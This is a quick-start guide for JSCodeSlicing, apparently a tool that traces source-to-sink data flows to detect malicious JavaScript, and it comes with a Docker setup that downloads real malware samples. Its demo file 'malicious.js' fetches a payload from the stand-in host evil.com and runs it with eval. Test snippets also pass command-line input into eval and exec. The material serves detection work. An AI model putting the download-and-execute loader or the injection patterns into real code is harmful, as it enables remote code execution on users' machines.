# 🚀 Quick Start Guide

Get up and running with JSCodeSlicing in 5 minutes!

---

## ⚡ TL;DR - Fastest Path

### Using Docker (Zero Setup)

```powershell
# 1. Clone repository
git clone https://github.com/yourusername/JSCodeSlicing.git
cd JSCodeSlicing

# 2. Run analysis with real malware
.\docker-test.ps1

# 3. View results
cat .\output\malware_samples\code_slice.txt
```

**Done!** You just analyzed 10 real malware samples safely.

---

## 📝 Step-by-Step Guides

### Option A: Docker (Recommended)

**Time:** ~5 minutes  
**Difficulty:** Easy  
**Best for:** Testing with real malware

#### Prerequisites
✅ Docker Desktop installed ([download here](https://www.docker.com/products/docker-desktop))

#### Steps

1. **Open PowerShell** (Windows) or Terminal (Mac/Linux)

2. **Navigate to project:**
   ```bash
   cd path/to/JSCodeSlicing
   ```

3. **Run Docker test:**
   ```powershell
   # Windows
   .\docker-test.ps1
   
   # Mac/Linux
   chmod +x docker-test.sh
   ./docker-test.sh
   ```

4. **Wait for completion** (~3-5 minutes)
   - Building image: 2-3 min
   - Downloading malware: 30 sec
   - Running analysis: 1-2 min

5. **Check results:**
   ```powershell
   # View code slices
   cat .\output\malware_samples\code_slice.txt
   
   # Check file size (should be ~6KB)
   ls .\output\malware_samples\
   ```

**Expected Output:**
```
Name             Length
----             ------
code_slice.txt   6217
cpg.bin          175522
```

---

### Option B: Local Setup (Windows)

**Time:** ~10 minutes  
**Difficulty:** Medium  
**Best for:** Development and custom analysis

#### Prerequisites
- Windows 10/11
- PowerShell

#### Steps

1. **Run automated setup:**
   ```powershell
   .\setup.ps1
   ```
   
   This installs:
   - ✅ Java (if missing)
   - ✅ SBT (Scala Build Tool)
   - ✅ astgen binary

2. **Verify installation:**
   ```powershell
   sbt --version
   java -version
   ```

3. **Create test file:**
   ```powershell
   # Create directory
   mkdir src\main\resources\input\test_sample
   
   # Create JavaScript file
   @"
   var input = process.argv[2];
   eval(input);
   "@ | Out-File src\main\resources\input\test_sample\test.js -Encoding UTF8
   ```

4. **Run analysis:**
   ```powershell
   sbt run
   ```

5. **View results:**
   ```powershell
   cat src\main\resources\output\test_sample\code_slice.txt
   ```

---

### Option C: Local Setup (Linux/Mac)

**Time:** ~10 minutes  
**Difficulty:** Medium

#### Prerequisites
- Java 17+: `java -version`
- SBT: [Install guide](https://www.scala-sbt.org/download.html)

#### Steps

1. **Download astgen:**
   ```bash
   # Create directory
   mkdir -p ./astgen
   
   # Download (choose your OS)
   # Mac:
   curl -L https://github.com/joernio/astgen/releases/download/v3.35.0/astgen-macos-arm -o ./astgen/astgen
   
   # Linux:
   curl -L https://github.com/joernio/astgen/releases/download/v3.35.0/astgen-linux -o ./astgen/astgen
   
   # Make executable
   chmod +x ./astgen/astgen
   ```

2. **Set environment variable:**
   ```bash
   # Add to ~/.bashrc or ~/.zshrc
   export ASTGEN_BIN="$(pwd)/astgen/astgen"
   
   # Or set temporarily
   export ASTGEN_BIN="$(pwd)/astgen/astgen"
   ```

3. **Create test file:**
   ```bash
   mkdir -p src/main/resources/input/test_sample
   
   cat > src/main/resources/input/test_sample/test.js << 'EOF'
   var input = process.argv[2];
   eval(input);
   EOF
   ```

4. **Run analysis:**
   ```bash
   sbt run
   ```

5. **View results:**
   ```bash
   cat src/main/resources/output/test_sample/code_slice.txt
   ```

---

## 🎯 Your First Analysis

### Analyze a Simple Malicious Script

Create this file: `src/main/resources/input/demo/malicious.js`

```javascript
// Download and execute payload
const http = require('http');
const { exec } = require('child_process');

http.get('http://evil.com/payload.js', (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
        eval(data);  // Execute downloaded code
    });
});
```

**Run:**
```bash
sbt run
```

**Expected Output:** `src/main/resources/output/demo/code_slice.txt`
```javascript
// File: malicious.js
// ======================================================================
Line 4: http.get('http://evil.com/payload.js', (res) => {...
Line 6: res.on('data', chunk => data += chunk)
Line 7: res.on('end', () => { eval(data); })
Line 8: eval(data)
```

**Analysis:**
- ✅ Detected source: `http.get()`
- ✅ Detected sink: `eval()`
- ✅ Flow traced: HTTP → eval

---

## 📊 Understanding the Results

### Output Files

```
output/
└── [package-name]/
    ├── code_slice.txt    # 📄 Human-readable code slices
    └── cpg.bin           # 📦 Binary CPG (for debugging)
```

### Reading code_slice.txt

```javascript
// File: malware.js
// ======================================================================
Line 5: var cmd = process.argv[2]     ← Source (user input)
Line 6: var shell = require('child_process')
Line 7: shell.exec(cmd)               ← Sink (command execution)
```

**Interpretation:**
- **Line 5:** Untrusted data enters from command-line argument
- **Line 7:** Data flows to dangerous `exec()` function
- **Verdict:** Code injection vulnerability

---

## 🐛 Troubleshooting Quick Fixes

### "ASTGEN_BIN not set"

```powershell
# Windows
$env:ASTGEN_BIN = "$PWD\astgen\astgen-win.exe"

# Linux/Mac
export ASTGEN_BIN="$(pwd)/astgen/astgen-linux"
```

### Empty code_slice.txt

**Possible reasons:**
1. No data flows detected → Add more complex code
2. Source/sink not defined → Check `SourceGroups.scala` and `SinkGroups.scala`
3. Simple test case → Try Docker with real malware

**Quick test:**
```javascript
// This WILL be detected
var x = process.argv[2];
eval(x);

// This might NOT be detected (no flow)
var x = "safe";
console.log(x);
```

### Docker Won't Start

```powershell
# Check Docker status
docker ps

# If error, start Docker Desktop
# Then retry:
.\docker-test.ps1
```

---

## 🎓 Next Steps

1. **Read the full README:** [README.md](README.md)
2. **Explore malware samples:** Run `.\docker-test.ps1`
3. **Customize detection:** Edit `SourceGroups.scala` and `SinkGroups.scala`
4. **Add your own samples:** Place JS files in `src/main/resources/input/`
5. **Check malware sources:** [MALWARE_LINKS.md](MALWARE_LINKS.md)

---

## 💡 Tips & Tricks

### Batch Analysis
```bash
# Add multiple packages
src/main/resources/input/
├── package1/
├── package2/
└── package3/

# Run once
sbt run

# All packages processed automatically!
```

### Clear Checkpoint
```bash
# Start fresh (re-analyze all)
rm src/main/resources/checkpoint.txt
rm src/main/resources/is_processing.txt
sbt run
```

### Export Results
```bash
# Copy all outputs
cp -r src/main/resources/output/ ~/Desktop/analysis-results/
```

---

## ❓ Common Questions

**Q: Is it safe to run on my computer?**  
A: Use Docker for malware analysis. It keeps samples isolated.

**Q: Can I analyze Node.js packages?**  
A: Yes! Place the entire package directory in `input/`.

**Q: How long does analysis take?**  
A: ~1-5 seconds per file, max 180 seconds (configurable).

**Q: What if nothing is detected?**  
A: Your code might be safe, or sources/sinks need tuning.

**Q: Can I add custom detection rules?**  
A: Yes! Edit `SourceGroups.scala` and `SinkGroups.scala`.

---

**Need help?** Open an issue on GitHub!

*Happy analyzing! 🔍*
